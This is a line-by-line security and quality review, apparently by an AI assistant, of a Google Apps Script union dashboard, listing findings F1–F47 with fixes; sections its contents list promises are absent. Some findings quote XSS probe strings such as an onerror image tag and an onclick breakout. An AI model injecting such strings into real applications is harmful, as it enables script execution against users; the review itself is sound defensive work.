# Code Review: Strategic Command Center — Line-by-Line Analysis

> **This is the canonical code review.** It supersedes all prior review documents, which have been archived to [`docs/archived-reviews/`](docs/archived-reviews/). Earlier reviews (v4.5.0) contained inaccurate "FIXED" and "LOW risk" assessments for issues that were still present — those documents should not be used for security or quality decisions.

**Date:** 2026-02-23 (updated)
**Reviewer:** Claude Code (Opus 4.6)
**Scope:** Full line-by-line codebase review — 30 source files (~59K lines), 23 test files, config/build infrastructure
**Version:** 4.9.0 (as of 2026-02-17)
**Previous Review:** 2026-02-14 (v4.7.0 — 69 issues, 57 fixed)
**2026-02-21 Update:** Re-verification pass — 33 new findings added (F76–F108), 1 false positive corrected (F94)
**Fix Pass:** 2026-02-21 — 30 findings fixed across 16 files (see individual finding annotations below)
**2026-02-23 Update:** In-depth line-by-line review of files 11_-17_ and 04e_ -- 8 new findings added (F109-F116), 2 existing findings verified as already fixed (F61, F62), F57 partially fixed (rate limiting present in MeetingCheckIn but needs verification in SelfService)

---

## Executive Summary

This is a production-grade Google Apps Script application (Union Steward Dashboard) with a well-organized 30-file modular architecture, 1,300+ tests, comprehensive security features, and a full CI/CD pipeline. The codebase has matured significantly since the v4.7.0 review, with most previously-identified critical issues resolved.

This line-by-line review originally identified **152 active findings** across all severity levels. The 2026-02-21 fix pass addressed **30 findings** (8 CRITICAL, 8 HIGH, 11 MEDIUM, 3 infrastructure). The 2026-02-23 in-depth review of files 11_-17_ and 04e_ added **8 new findings** (F109-F116) and verified 2 existing findings as already fixed (F61, F62). **128 findings remain open**. Additionally, 7 findings (F34a, F34b, F34c, F35b, F35c, F61, F62) were verified as **already fixed or false positives**.

| Severity | Count | Key Themes |
|----------|------:|-----------|
| CRITICAL | 20 | XSS via innerHTML injection, URL injection (window.open), unsanitized email HTML, onclick attribute injection, CSV preview, systematic column indexing bugs |
| HIGH | 38 | Missing input validation, unescaped URLs in portal href attributes (F109), XSS in reminder dialog template literals (F112), no rate limiting on email/PIN, N+1 patterns, missing locks, disabled ESLint rules, unescaped steward/member names in dashboards |
| MEDIUM | 67 | Dead code, inconsistent error handling, version mismatches, CI gaps, formula injection in expansion data and meeting check-in (F114, F115), incomplete attribute escaping (F113), unescaped member IDs in portal footer (F110), EventBus diagnostic innerHTML (F111) |
| LOW | 35 | Code duplication, naming inconsistencies, documentation gaps, missing correlation sample size (F116) |

**Overall Assessment: Good architecture with targeted security gaps** -- The codebase is well-structured, thoroughly tested, and shows strong security awareness in many areas. The 2026-02-23 in-depth review of files 11_-17_ and 04e_ found that **13_MemberSelfService.gs** has exemplary XSS prevention (100% escapeHtml coverage on all dynamic fields), and **15_EventBus.gs** has proper error isolation and unsubscribe mechanisms (F61, F62 already fixed). The remaining gaps are: unescaped template literal injection in the reminder dialog (F112, HIGH), unvalidated Config-sourced URLs in portal href attributes (F109, HIGH), and several formula injection paths (F114, F115). The `04e_PublicDashboard.gs` drill-down modal (F82, previously documented) and the alert center populate unescaped data into innerHTML -- these remain the highest-priority XSS items for the public-facing dashboard.

---

## Table of Contents

1. [Foundation Layer (00_*)](#1-foundation-layer)
2. [Core & Constants (01_Core.gs)](#2-core--constants)
3. [Data Managers (02_DataManagers.gs)](#3-data-managers)
4. [UI Components (03_UIComponents.gs)](#4-ui-components)
5. [UI/Dashboard Layer (04a-04e)](#5-uidashboard-layer)
6. [Integrations (05_Integrations.gs)](#6-integrations)
7. [Maintenance (06_Maintenance.gs)](#7-maintenance)
8. [DevTools (07_DevTools.gs)](#8-devtools)
9. [Sheet Utilities (08a-08d)](#9-sheet-utilities)
10. [Dashboards (09_Dashboards.gs)](#10-dashboards)
11. [Business Logic (10_Main.gs, 10a-10d)](#11-business-logic)
12. [CommandHub through CorrelationEngine (11-17)](#12-commandhub-through-correlationengine)
13. [Build & Infrastructure](#13-build--infrastructure)
14. [Cross-Cutting Concerns](#14-cross-cutting-concerns)
15. [Re-Verification Findings (2026-02-21 Update)](#15-re-verification-findings-2026-02-21-update)
16. [Thorough Re-Review Findings (2026-02-23 Update)](#16-thorough-re-review-findings-2026-02-23-update)

---

## 1. Foundation Layer

### 00_DataAccess.gs (626 lines)

**Strengths:**
- Clean DAL pattern with singleton caching
- Proper cache invalidation with timeout (5 minutes)
- Batch read/write operations reduce API calls
- Good fallback pattern for `SHEETS` constants with `typeof` checks

**Findings:**

#### F1. `setCells()` defeats batching purpose — individual `setValue()` per cell
**Severity:** MEDIUM | **Category:** Performance | **Lines:** 296-301

```javascript
// Current: still calls setValue() per cell in inner loop
for (var col in updates) {
  sheet.getRange(parseInt(row), parseInt(col)).setValue(updates[col]);
}
```

**Issue:** The method groups cells by row but still calls `setValue()` individually. This creates N API calls instead of 1.

**Fix:** Use `setValues()` with a range encompassing all cells in each row, or collect all updates into a single `setValues()` call covering the full bounding box.

---

#### F2. `getRows()` reads entire sheet even for small row sets
**Severity:** LOW | **Category:** Performance | **Lines:** 192-210

When only 2-3 rows are needed from a 10,000-row sheet, fetching `getDataRange().getValues()` is wasteful. For small `rowNumbers` arrays, individual `getRange()` calls would be faster.

**Fix:** Add a threshold — if `rowNumbers.length < 5`, fetch individually; otherwise bulk-read.

---

#### F3. `DataAccess.getMemberById` duplicates `DataAccess.findRow`
**Severity:** LOW | **Category:** Quality | **Lines:** 354-381

`getMemberById()` and `findRow()` both iterate all data. `getMemberById` could call `findRow` internally and just map the result.

---

#### F4. TIME_CONSTANTS getters create coupling to load order
**Severity:** LOW | **Category:** Maintainability | **Lines:** 551-584

The `get` accessors referencing `DEADLINE_DEFAULTS` use `typeof` guards, which is correct but adds runtime overhead on every access. Consider initializing once after load.

---

### 00_Security.gs (1,158 lines)

**Strengths:**
- Comprehensive XSS prevention with `escapeHtml()` covering all special characters
- Formula injection prevention in `escapeForFormula()`
- PII masking for logs (`maskEmail`, `maskPhone`, `maskName`)
- Security event alerting with severity-based routing (CRITICAL → immediate email, HIGH → daily digest)
- Zero-knowledge survey vault design with SHA-256 hashing
- Client-side security script injection for consistency

**Findings:**

#### F5. `isValidSafeString()` blocks `data:` URIs — potential false positive
**Severity:** LOW | **Category:** Quality | **Lines:** 611-626

The pattern `/data:/i` will reject any string containing "data:" even in legitimate contexts like "Calibration data: complete". This is overly aggressive.

**Fix:** Restrict to start-of-string or specific URI patterns: `/^data:/i` or `/data:\s*text\/html/i`.

---

#### F6. `sendSecurityAlertEmail_()` exposes PII in email body
**Severity:** MEDIUM | **Category:** Security | **Lines:** 868-880

While email-type fields are masked, other `details` keys (names, IDs, descriptions) pass through unmasked. If a security event includes member names in non-standard keys, they'll be exposed in the email.

**Fix:** Apply `maskMemberForLog()` to the entire details object, or whitelist which keys are safe to include.

---

#### F7. `queueSecurityDigestEvent_()` may overflow ScriptProperties
**Severity:** LOW | **Category:** Bug | **Lines:** 896-931

The queue is capped at 100 entries, but each entry includes `JSON.stringify(safeDetails)` which could be arbitrarily large. ScriptProperties has a 9KB per-key limit.

**Fix:** Add a byte-size check or truncate `safeDetails` values.

---

#### F8. `safeJsonForHtml()` double-escapes when used with `escapeHtml()`
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 699-712

`safeJsonForHtml()` runs `escapeHtml()` on every string value. If this JSON is later rendered in a context that also calls `escapeHtml()`, users will see `&amp;amp;` instead of `&`.

**Fix:** Document clearly that this function's output should NOT be further escaped, or provide a separate function for JSON that doesn't escape values.

---

## 2. Core & Constants

### 01_Core.gs (~2,100 lines)

**Strengths:**
- Auto-derived column system (`buildColsFromMap_`) is elegant and eliminates manual index management
- Runtime column sync (`syncColumnMaps()`) handles user-reordered sheets
- Column persistence via CacheService avoids re-reading headers on every trigger
- Clean separation of 1-indexed (`*_COLS`) and 0-indexed (`*_COLUMNS`) constants
- Comprehensive version history tracking

**Findings:**

#### F9. `sendCriticalErrorNotification_()` accesses `COMMAND_CONFIG.EMAIL` before it may be initialized
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 211-226

```javascript
var subject = COMMAND_CONFIG.EMAIL.SUBJECT_PREFIX + ' Critical Error: ' + errorInfo.context;
```

If this function fires before `COMMAND_CONFIG` is fully loaded (e.g., during initialization errors), it will throw, silently swallowing the critical error notification.

**Fix:** Wrap in try/catch with fallback values, similar to how `sendSecurityAlertEmail_()` does it in 00_Security.gs.

---

#### F10. ~~`VERSION_INFO` (4.7.0) disagrees with `package.json` and `CHANGELOG.md` (4.9.0)~~ **FIXED**
**Severity:** HIGH | **Category:** Bug | **Lines:** 670-678
**Fixed:** Updated `VERSION_INFO`, `API_VERSION`, and `COMMAND_CONFIG.VERSION` to 4.9.0 in `01_Core.gs`. Updated `package.json` to 4.9.0.

```javascript
var VERSION_INFO = {
  MAJOR: 4, MINOR: 7, PATCH: 0,
  BUILD: 'v4.7.0', CURRENT: '4.7.0',
  BUILD_DATE: '2026-02-14',
```

The CHANGELOG shows v4.9.0 (2026-02-17). Both `VERSION_INFO` and `API_VERSION` still show 4.7.0. This means version checks, about dialogs, and audit logs report the wrong version.

**Fix:** Update to `4.9.0` with the correct build date `2026-02-17`.

---

#### F11. Duplicate `API_VERSION` and `VERSION_INFO` objects
**Severity:** LOW | **Category:** Quality | **Lines:** 446-453, 670-678

Two separate version objects exist: `API_VERSION` (4.7.0) and `VERSION_INFO` (4.7.0). Both track the same information redundantly.

**Fix:** Consolidate into one `VERSION` constant.

---

#### F12. `COMMAND_CONFIG.SYSTEM_NAME` getter calls `getSystemName_()` which calls `getLocalNumberFromConfig_()` on every access
**Severity:** MEDIUM | **Category:** Performance | **Lines:** 542, 638-660

Every time `COMMAND_CONFIG.SYSTEM_NAME` is accessed (which happens frequently in toast messages, emails, menus), it reads from the Config sheet. With no caching, this adds a Sheets API call each time.

**Fix:** Cache the result after first call (memoize pattern).

---

#### F13. `SHEETS.DASHBOARD` still references deprecated `'💼 Dashboard'`
**Severity:** LOW | **Category:** Quality | **Lines:** 731

Marked `@deprecated v4.3.2` but the constant and its aliases (`REPORTS`) remain. Old code references still work, but this creates confusion about which sheet is canonical.

---

#### F14. ~~`MEMBER_COLS.STATE` used as array length in `importMembersFromData`~~ **FIXED**
**Severity:** MEDIUM | **Category:** Bug | **Lines (02_DataManagers.gs):** 1307, 1434
**Fixed:** Both instances changed to `new Array(MEMBER_HEADER_MAP_.length).fill('')`.

```javascript
var newRow = new Array(MEMBER_COLS.STATE).fill('');
```

This creates an array sized to `MEMBER_COLS.STATE` (38). But if `ZIP_CODE` (column 39) is the actual last column, data for ZIP_CODE would be silently dropped. This should use `MEMBER_HEADER_MAP_.length`.

**Fix:** `new Array(MEMBER_HEADER_MAP_.length).fill('')`

---

## 3. Data Managers

### 02_DataManagers.gs (~1,500+ lines)

**Strengths:**
- Multi-Key Smart Match (`findExistingMember`) with priority-based matching is well-designed
- Batch import with progress bar UI is production-quality
- Proper duplicate detection across multiple keys (ID, email, name)
- Steward promotion/demotion with two-step confirmation is thoughtful UX

**Findings:**

#### F15. `addMember()` uses individual `setValue()` calls — N API calls per member
**Severity:** HIGH | **Category:** Performance | **Lines:** 27-53

```javascript
sheet.getRange(newRow, MEMBER_COLS.MEMBER_ID).setValue(memberId);
sheet.getRange(newRow, MEMBER_COLS.FIRST_NAME).setValue(memberData.firstName || '');
// ... 6 more setValue calls
```

Each `setValue()` is a separate API call. For a single member addition this is 8 API calls.

**Fix:** Build an array and use a single `setValues()` call, like `importMembersFromData` already does.

---

#### F16. `updateMember()` has 0-indexed/1-indexed mismatch with `addMember()`
**Severity:** HIGH | **Category:** Bug | **Lines:** 60-91 vs 27-53

In `addMember()`, column references are used directly as 1-indexed ranges: `sheet.getRange(newRow, MEMBER_COLS.MEMBER_ID)`.

In `updateMember()`, array comparison uses `MEMBER_COLS.MEMBER_ID - 1`:
```javascript
if (data[i][MEMBER_COLS.MEMBER_ID - 1] === memberId)
```

But the `setValue()` calls use the 1-indexed constants directly:
```javascript
sheet.getRange(memberRow, MEMBER_COLS.FIRST_NAME).setValue(updateData.firstName);
```

This is actually correct (array access is 0-indexed, Range is 1-indexed), but the inconsistency between these two patterns within the same module is error-prone.

---

#### F17. `updateMember()` cannot clear fields — falsy check prevents setting empty values
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 84-91

```javascript
if (updateData.firstName) sheet.getRange(...).setValue(updateData.firstName);
```

If you want to clear a field by setting it to `''`, the `if` check prevents it. Should use `!== undefined` check.

**Fix:** `if (updateData.firstName !== undefined)`

---

#### F18. `generateMemberID_()` has linear scan for available IDs — O(900) worst case
**Severity:** LOW | **Category:** Performance | **Lines:** 190-199

The loop from 100 to 999 could be slow if many IDs with the same prefix exist. Not a practical issue at typical union sizes.

---

#### F19. ~~CSV import preview injects unsanitized data into HTML~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines (client-side JS):** 1115-1125
**Fixed:** Added `getClientSideEscapeHtml()` to the CSV dialog script block and wrapped `h` and `cell` values with `escapeHtml()` in `showPreview()`.

```javascript
'  csvHeaders.forEach(function(h) { html += "<th>" + h + "</th>"; });
'  rows.forEach(function(row) {
'    row.forEach(function(cell) { html += "<td>" + (cell || "-") + "</td>"; });
```

CSV data from the user is directly interpolated into HTML without escaping. A CSV file with `<img src=x onerror=alert(1)>` as a header or cell value would execute arbitrary JavaScript.

**Fix:** Use `escapeHtml()` on `h` and `cell` values.

---

#### F20. `updateMemberDataBatch()` reads all data but only writes one row
**Severity:** LOW | **Category:** Performance | **Lines:** 887-936

Named "batch" but it reads the entire sheet and writes a single row back. The batch naming is misleading — it's batch-read but single-write.

---

#### F21. `showExportMembersDialog()` could expose PII
**Severity:** MEDIUM | **Category:** Security | **Lines:** ~1486+

The export function should verify the user has appropriate permissions before allowing export of member PII data.

---

## 4. UI Components

### 03_UIComponents.gs (2,767 lines)

**Findings:**

#### F22. ~~CRITICAL: XSS in mobile grievance list — `innerHTML` with unescaped data~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Line:** 1282
**Fixed:** Added `getClientSideEscapeHtml()` and wrapped `g.id`, `g.status`, `g.memberName`, `g.issueType`, `g.filedDate` with `escapeHtml()`.

The client-side `render()` function in `showMobileGrievanceList()` injects grievance data directly into `innerHTML` without escaping. Member names, issue types, and statuses from the spreadsheet are concatenated into HTML without `escapeHtml`:

```javascript
c.innerHTML=data.map(function(g){
  return"..."+g.memberName+"...</div>..."+g.issueType+"..."
}).join("")
```

**Fix:** Include `getClientSideEscapeHtml()` in the `<script>` block and wrap all data fields.

---

#### F22a. ~~CRITICAL: XSS in mobile unified search — `innerHTML` with unescaped data~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Line:** 1325
**Fixed:** Added `getClientSideEscapeHtml()` and wrapped `r.title`, `r.subtitle`, `r.detail` with `escapeHtml()`.

Same pattern — `r.title`, `r.subtitle`, `r.detail` from `getMobileSearchData()` (member names, emails, grievance IDs) injected into `innerHTML` without escaping.

**Fix:** Include `getClientSideEscapeHtml()` and wrap all data interpolations.

---

#### F22b. ~~CRITICAL: XSS in advanced search results — missing client-side escapeHtml~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines:** 2725-2733
**Fixed:** Added `getClientSideEscapeHtml()` to advanced search script block. Replaced inline onclick injection with `data-id`/`data-type` attributes and `this.dataset` access. Wrapped all `<td>` values with `escapeHtml()`.

The advanced search results table injects `r.name`, `r.details`, `r.status` directly into `innerHTML`. While `getClientSideEscapeHtml()` is included in the desktop search dialog (line 2383), it is NOT included in the advanced search dialog script block, so `escapeHtml` would be undefined.

**Fix:** Add `getClientSideEscapeHtml()` to the advanced search `<script>` tag.

---

#### F22c. ~~CRITICAL: XSS in desktop search via `onclick` attribute injection~~ **FIXED**
**Severity:** CRITICAL | **Category:** Security | **Line:** 2363
**Fixed:** Replaced inline onclick string concatenation with `data-id`/`data-type` attributes and `this.dataset.id`/`this.dataset.type` access pattern.

`item.id` and `item.type` are injected into an `onclick` attribute via string concatenation. A crafted ID like `'); alert('xss` breaks out of the JS string context. HTML entity escaping is insufficient for JS within event handlers.

```javascript
html += '<div onclick="selectResult(\'' + item.id + '\', \'' + item.type + '\')">';
```

**Fix:** Use `data-*` attributes with event delegation instead of inline onclick handlers.

---

#### F23. ~~Unescaped grievance data in `showGrievanceQuickActions()`~~ **FIXED**
**Severity:** HIGH | **Category:** Security | **Lines:** 1600-1611
**Fixed:** Wrapped `grievanceId`, `name`, `memberId`, `memberEmail`, `status`, `step` with `escapeHtml()` for HTML context. Replaced onclick string concatenation with `JSON.stringify()` for JS context. Also fixed F23c (missing grievanceId argument to `setupDriveFolderForGrievance`).

`grievanceId`, `name`, `memberId`, `memberEmail`, `status`, `step` are all interpolated directly into HTML without `escapeHtml()`. Compare to `showMemberQuickActions()` (line 1526) which correctly uses `escapeHtml()`.

**Fix:** Wrap all data values with `escapeHtml()`.

---

#### F23a. `quickUpdateGrievanceStatus()` — no validation of row or status
**Severity:** HIGH | **Category:** Bug/Security | **Lines:** 1626-1636

Receives `row` directly from the client-side dialog and writes without validating row bounds or that the status is in an allowed list. If the sheet was modified between dialog open and click, the wrong row gets updated.

**Fix:** (1) Validate `2 <= row <= sheet.getLastRow()`. (2) Validate `newStatus` against allowlist. (3) Use grievanceId lookup instead of trusting row number.

---

#### F23b. `sendQuickEmail()` — no email validation or rate limiting
**Severity:** HIGH | **Category:** Security | **Lines:** 1673-1678

Callable from client-side HTML. Sends email to any address without format validation or confirming it matches the member's actual email. No rate limiting — could be abused to send spam.

**Fix:** (1) Validate email format. (2) Verify `to` matches member's email on file. (3) Add rate limiting via CacheService.

---

#### F23c. `setupDriveFolderForGrievance()` called without required argument
**Severity:** MEDIUM | **Category:** Bug | **Line:** 1610

The quick actions button calls `google.script.run.setupDriveFolderForGrievance()` without passing `grievanceId`, but the server-side function requires it. This will silently fail with `undefined`.

**Fix:** Pass the grievance ID (with proper escaping for JS context).

---

#### F23d. Row-by-row theme application — N+1 API pattern
**Severity:** MEDIUM | **Category:** Performance | **Lines:** 514-521, 850-857

Both `applyThemeToSheet_()` and `applyZebraStripes()` apply colors one row at a time. For 1,000 rows, that's 1,000 API calls.

**Fix:** Build a 2D array and use a single `Range.setBackgrounds()` call.

---

#### F23e. `previewTheme()` passes argument that `applyThemeToSheet_()` ignores
**Severity:** MEDIUM | **Category:** Bug | **Line:** 1007

`previewTheme(themeKey)` calls `applyThemeToSheet_(sheet, themeKey)` but the function signature only accepts `sheet`. The theme key is silently ignored, so preview always uses the saved theme.

**Fix:** Update `applyThemeToSheet_` to accept optional `themeKey` parameter.

---

#### F24. Large HTML string concatenation throughout the file
**Severity:** MEDIUM | **Category:** Maintainability | **Lines:** Throughout

All HTML dialogs are built via string concatenation. This makes XSS auditing nearly impossible. The file contains 5 originally-separate modules concatenated into 2,767 lines.

**Suggestion:** Split into `03a_MenuNav.gs`, `03b_ThemeService.gs`, `03c_MobileInterface.gs`, `03d_QuickActions.gs`, `03e_SearchDialogs.gs`.

---

#### F24a. Multiple functions build identical CSS frameworks inline
**Severity:** LOW | **Category:** Quality | **Lines:** Throughout

The same CSS theme (dark mode, gradients, card layouts) is duplicated across dozens of dialog functions.

---

## 5. UI/Dashboard Layer

### 04a_UIMenus.gs (~700 lines)

**Findings:**

#### F25. Menu structure has >40 items — usability concern
**Severity:** LOW | **Category:** Quality

The three menus (Union Hub, Tools, Admin) collectively have 40+ items. Consider grouping with more sub-menus.

---

### 04b_AccessibilityFeatures.gs (~1,200 lines)

**Strengths:**
- WCAG-aware design with contrast ratios
- Keyboard navigation support
- Font scaling with user preference persistence
- Color-blind friendly palettes

**Findings:**

#### F26. Font size preferences stored in UserProperties — no validation
**Severity:** LOW | **Category:** Security | **Lines:** Various

Font size values from UserProperties are applied without bounds checking. A corrupted value could inject CSS.

**Fix:** Parse to integer and clamp between 8 and 24.

---

### 04c_InteractiveDashboard.gs (~3,100 lines)

**Findings:**

#### F27. Dashboard data passed to client without consistent sanitization
**Severity:** HIGH | **Category:** Security | **Lines:** Various

Server-side data for the interactive dashboard is JSON-stringified and embedded in HTML. Not all fields are consistently sanitized before embedding.

---

### 04d_ExecutiveDashboard.gs (~1,100 lines)

No critical findings. Well-structured with proper use of `escapeHtml()` in most locations.

---

### 04e_PublicDashboard.gs (~6,800 lines — LARGEST FILE)

**Findings:**

#### F28. File is 258KB / ~6,800 lines — far too large for a single module
**Severity:** HIGH | **Category:** Maintainability

This is the largest file in the codebase and contains the entire public-facing web app (HTML, CSS, JavaScript, server-side logic). It should be split into at least 4 files: routing, HTML templates, server data, CSS/JS assets.

---

#### F29. Public dashboard generates massive HTML strings in memory
**Severity:** MEDIUM | **Category:** Performance | **Lines:** Throughout

The entire HTML page (including all CSS and JS) is built as a single string concatenation and returned via `HtmlService.createHtmlOutput()`. For a ~200KB HTML page, this puts significant memory pressure on the GAS runtime.

---

#### F30. Member authentication PIN check in public web app
**Severity:** HIGH | **Category:** Security | **Lines:** Various

The public dashboard has a PIN-based authentication flow. Review that:
1. PINs are compared using constant-time comparison to prevent timing attacks
2. Rate limiting exists for PIN attempts
3. PIN hashes use proper salting (SHA-256 with per-installation salt is documented)

---

## 6. Integrations

### 05_Integrations.gs (~4,000 lines)

**Findings:**

#### F31. Google Calendar integration creates events without checking quota
**Severity:** MEDIUM | **Category:** Bug | **Lines:** Various

Calendar event creation doesn't check for existing events with the same title/date before creating, which could lead to duplicates on retry.

---

#### F32. Drive folder creation has no error recovery for partial failures
**Severity:** MEDIUM | **Category:** Bug | **Lines:** Various

If folder creation succeeds but subfolder or file operations fail, orphaned folders are left in Drive with no cleanup.

---

#### F33. Constant Contact OAuth token stored in ScriptProperties
**Severity:** MEDIUM | **Category:** Security | **Lines:** Various

OAuth2 tokens and refresh tokens are stored in ScriptProperties. While this is the standard GAS pattern, anyone with script edit access can read these tokens. Document this as a known limitation.

---

#### F34. Email sending functions don't check `MailApp.getRemainingDailyQuota()` consistently
**Severity:** MEDIUM | **Category:** Bug | **Lines:** Various

Some email functions check the quota, others don't. When the 100 email/day limit is hit, the function will throw an unhandled error.

**Fix:** Create a central `safeSendEmail()` wrapper that checks quota.

---

#### F34a. ~~XSS via URL injection in `setupFolderForSelectedGrievance()`~~ **VERIFIED ALREADY FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines:** 254-257
**Verified:** Code at line 269 already uses `JSON.stringify(existingUrl)`. This was a false positive in the original review.

The `existingUrl` value is read from a cell and interpolated into a `<script>` tag without escaping:

```javascript
var html = HtmlService.createHtmlOutput(
  '<script>window.open("' + existingUrl + '", "_blank"); ...'
```

A URL containing `"` or `</script>` enables arbitrary JS execution. Compare with `openGrievanceFolder()` at line 375 which correctly uses `JSON.stringify()`.

**Fix:** `'<script>window.open(' + JSON.stringify(existingUrl) + ', "_blank");...'`

---

#### F34b. ~~XSS via URL injection in `createPDFForSelectedGrievance()`~~ **VERIFIED ALREADY FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines:** 1402-1404
**Verified:** Code at line 1381 already uses `JSON.stringify(folder.getUrl())`. This was a false positive in the original review.

Same pattern — `folder.getUrl()` is interpolated into raw HTML without escaping.

**Fix:** Use `JSON.stringify()` for the URL.

---

#### F34c. ~~HTML injection in email bodies — member names unescaped~~ **VERIFIED ALREADY FIXED**
**Severity:** CRITICAL | **Category:** Security | **Lines:** 520-546, 715-721
**Verified:** Code at lines 539-542 and 559 already uses `escapeHtml()` for all dynamic values in email HTML. This was a false positive in the original review.

In `emailMeetingAttendanceReport()` and `emailMeetingDocLink()`, member names, IDs, meeting names, and URLs are interpolated directly into HTML email bodies without `escapeHtml()`. A member name like `<img src=x onerror=alert(1)>` would execute in email clients that render HTML.

**Fix:** Apply `escapeHtml()` to all dynamic values in email HTML bodies.

---

#### F34d. Race condition in `onGrievanceFormSubmit()` — uses `getLastRow()` instead of event range
**Severity:** HIGH | **Category:** Bug | **Lines:** 1474-1483

After a form submission, the code assumes the form response was appended at `sheet.getLastRow()`. If concurrent submissions arrive, this may reference the wrong row.

**Fix:** Use `e.range` from the form submission event to identify the exact row.

---

#### F34e. Variable shadowing: `catch (e)` shadows form event parameter `e`
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 1458, 1490

```javascript
function onGrievanceFormSubmit(e) {
  try { ... } catch (e) { /* shadows parameter 'e'! */ }
}
```

**Fix:** Rename to `catch (err)`.

---

## 7. Maintenance

### 06_Maintenance.gs (~3,200 lines)

**Findings:**

#### F35. `logAuditEvent()` stores user email in plaintext
**Severity:** HIGH | **Category:** Security | **Lines:** Various

Audit log entries contain the full user email address. This is PII and should be hashed or masked, especially since the audit log is a hidden sheet that could be exposed.

**Fix:** Use `maskEmail()` for stored audit entries, keeping full email only in the integrity hash computation.

---

#### F35a. Undo system stores full row data in UserProperties (9KB limit)
**Severity:** HIGH | **Category:** Bug | **Lines:** 968-978

`saveUndoHistory()` stores `beforeState`/`afterState` (full row data arrays) in `UserProperties` which has a ~9KB per-property limit. With 50 actions, this easily exceeds the limit and silently fails.

**Fix:** Limit data stored per action (only deltas), or use a hidden sheet for larger payloads.

---

#### F35b. ~~Missing HTML escaping in audit log viewer~~ **VERIFIED ALREADY FIXED**
**Severity:** HIGH | **Category:** Security | **Lines:** 2910-2928
**Verified:** Code at lines 2920-2923 already uses `escapeHtml(String(...))` for all dynamic values. This was a false positive in the original review.

In `showAuditLogViewer()`, audit log details (which can contain user-supplied data) are rendered into HTML without escaping. If a field edit included `<script>` content, it would be logged and rendered unsafely.

**Fix:** Use `escapeHtml()` on all dynamic values.

---

#### F35c. ~~Steward workload dashboard missing XSS escaping~~ **VERIFIED ALREADY FIXED**
**Severity:** HIGH | **Category:** Security | **Lines:** 2549-2569
**Verified:** Code at lines 2556-2558 already uses `escapeHtml(String(...))` for steward names and counts. This was a false positive in the original review.

In `showStewardWorkloadDashboard()`, steward names are injected directly into HTML without `escapeHtml()`.

---

#### F36. Audit log integrity hash uses predictable algorithm
**Severity:** MEDIUM | **Category:** Security | **Lines:** Various

The integrity hash for audit entries is computed from row data. If the algorithm is known (it's in source code), an attacker with sheet access could modify entries and recompute valid hashes.

**Fix:** Use an HMAC with a secret key stored in ScriptProperties.

---

#### F36a. Duplicate audit logging functions with conflicting schemas
**Severity:** MEDIUM | **Category:** Quality | **Lines:** 1463-1530, 2807-2845

`logAuditEvent()` and `logIntegrityEvent()` both create audit sheets, append rows, and trim entries — but with different schemas and trim limits (10,000 vs 5,000).

**Fix:** Consolidate into a single audit function with a consistent schema.

---

#### F36b. `removeDeprecatedTabs()` prefix matching could delete valid sheets
**Severity:** MEDIUM | **Category:** Bug | **Lines:** 259-293

The `TEST_` prefix match would delete user-created sheets like `TEST_RESULTS`.

**Fix:** Use exact matches or require confirmation for each sheet.

---

#### F36c. Hardcoded timezone `'America/New_York'` in `createWeeklySnapshot()`
**Severity:** MEDIUM | **Category:** Maintainability | **Line:** 1722

**Fix:** Use `Session.getScriptTimeZone()`.

---

#### F37. `runDiagnostics()` performs many individual sheet reads
**Severity:** LOW | **Category:** Performance | **Lines:** Various

The diagnostics function reads multiple sheets individually. Could batch-read all needed data.

---

## 8. DevTools

### 07_DevTools.gs (~3,100 lines)

**Findings:**

#### F38. Seed data functions should be gated behind environment check
**Severity:** HIGH | **Category:** Security | **Lines:** Various

Functions like `seedDemoData()`, `nukeAllData()` are powerful destructive operations. While they have confirmation dialogs, they should also check for a development flag or environment variable.

---

#### F39. `nukeAllData()` deletes data without backup
**Severity:** MEDIUM | **Category:** Bug | **Lines:** Various

No automatic backup is created before nuking. Consider creating a snapshot first.

---

#### F40. DevTools removed in production build (`--prod` flag)
**Severity:** LOW | **Category:** Quality

This is good practice — noted as positive. The build system correctly excludes `07_DevTools.gs` in production.

---

## 9. Sheet Utilities

### 08a_SheetSetup.gs (~600 lines)

No critical findings. Clean sheet initialization code.

---

### 08b_SearchAndCharts.gs (~850 lines)

**Findings:**

#### F41. Search function doesn't limit result size
**Severity:** LOW | **Category:** Performance | **Lines:** Various

A search across a large member directory returns all matches without pagination. For very large unions (1000+ members), this could be slow.

---

### 08c_FormsAndNotifications.gs (~2,200 lines)

**Findings:**

#### F42. `onSatisfactionFormSubmit()` processes form response synchronously
**Severity:** MEDIUM | **Category:** Performance | **Lines:** Various

Form submission triggers run synchronously, reading from the Member Directory and Survey Vault. For large datasets, this could exceed the GAS execution time limit.

---

#### F43. Email reminder cooldown relies on ScriptProperties timestamp
**Severity:** LOW | **Category:** Bug | **Lines:** Various

The 7-day cooldown for survey reminders uses ScriptProperties. If the property is deleted or corrupted, all cooldowns reset and members could get spammed.

---

### 08d_AuditAndFormulas.gs (~2,200 lines)

**Findings:**

#### F44. Self-healing formulas recreate on every `onOpen`
**Severity:** LOW | **Category:** Performance | **Lines:** Various

Formula sheets are rebuilt on every spreadsheet open. A check for existing formulas could avoid unnecessary writes.

---

## 10. Dashboards

### 09_Dashboards.gs (~4,500 lines)

**Findings:**

#### F45. Dashboard HTML exceeds GAS `HtmlService` size limits for complex datasets
**Severity:** MEDIUM | **Category:** Performance | **Lines:** Various

The steward dashboard generates HTML with all grievance data embedded as JSON. For unions with hundreds of grievances, the HTML output could approach or exceed GAS limits.

**Fix:** Use `google.script.run` to fetch data asynchronously instead of embedding in the page.

---

#### F46. Multiple dashboard functions duplicate identical data-fetching logic
**Severity:** MEDIUM | **Category:** Quality | **Lines:** Various

Each dashboard type (steward, member, executive) has its own data-fetching code that reads the same sheets. A shared data provider would reduce duplication.

---

## 11. Business Logic

### 10_Main.gs (~2,700 lines)

**Findings:**

#### F47. `onOpen()` trigger does too much work
**Severity:** HIGH | **Category:** Performance | **Lines:** Various

The `onOpen()` trigger builds menus, enforces hidden sheets, syncs column maps, and runs validations. GAS gives `onOpen` only 30 seconds. Under load, this could timeout.

**Fix:** Defer non-critical operations to a separate timed trigger.

